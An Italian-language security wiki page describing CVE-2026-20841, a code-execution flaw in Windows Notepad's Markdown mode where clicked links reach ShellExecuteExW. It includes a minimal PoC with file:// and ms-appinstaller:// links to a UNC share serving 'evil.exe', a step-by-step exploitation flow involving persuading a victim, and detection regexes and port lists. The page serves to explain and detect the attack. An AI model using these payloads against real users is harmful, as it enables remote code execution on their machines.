# Abuso di Protocol Handler / ShellExecute su Windows (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Le moderne applicazioni Windows che renderizzano Markdown/HTML spesso trasformano i link forniti dall'utente in elementi cliccabili e li passano a `ShellExecuteExW`. Senza un allowlisting rigoroso degli scheme, può essere attivato qualsiasi protocol handler registrato (es. `file:`, `ms-appinstaller:`), portando a esecuzione di codice nel contesto dell'utente corrente.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad sceglie la modalità Markdown **solo per le estensioni `.md`** tramite un confronto di stringa fisso in `sub_1400ED5D0()`.
- Link Markdown supportati:
- Standard: `[text](target)`
- Autolink: `<target>` (reso come `[target](target)`), quindi entrambe le sintassi sono importanti per i payload e il rilevamento.
- I click sui link sono processati in `sub_140170F60()`, che effettua un filtraggio debole e poi chiama `ShellExecuteExW`.
- `ShellExecuteExW` delega a **qualsiasi protocol handler configurato**, non solo HTTP(S).

### Considerazioni sui payload
- Qualsiasi sequenza `\\` nel link viene **normalizzata in `\`** prima di `ShellExecuteExW`, influenzando la costruzione di UNC/path e il rilevamento.
- I file `.md` **non sono associati a Notepad di default**; la vittima deve comunque aprire il file in Notepad e cliccare il link, ma una volta renderizzato il link è cliccabile.
- Schemi di esempio pericolosi:
- `file://` per lanciare un payload locale/UNC.
- `ms-appinstaller://` per attivare i flussi di App Installer. Altri schemi registrati localmente possono anch'essi essere sfruttati.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Flusso di sfruttamento
1. Crea un file **`.md`** in modo che Notepad lo renda come Markdown.
2. Incorpora un link usando uno schema URI pericoloso (`file:`, `ms-appinstaller:`, o qualsiasi handler installato).
3. Consegna il file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB o simili) e convinci l'utente ad aprirlo in Notepad.
4. Al clic, il **link normalizzato** viene passato a `ShellExecuteExW` e il corrispondente protocol handler esegue il contenuto referenziato nel contesto dell'utente.

## Idee per il rilevamento
- Monitora i trasferimenti di file `.md` su porte/protocolli che comunemente veicolano documenti: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Esegui il parsing dei link Markdown (standard e autolink) e cerca in modo **insensibile al maiuscolo/minuscolo** `file:` o `ms-appinstaller:`.
- Regex guidate dal vendor per intercettare l'accesso a risorse remote:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Il comportamento della patch sembra **allowlists local files and HTTP(S)**; tutto il resto che raggiunge `ShellExecuteExW` è sospetto. Estendere le rilevazioni ad altri gestori di protocollo installati secondo necessità, poiché la superficie d'attacco varia a seconda del sistema.

## References
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
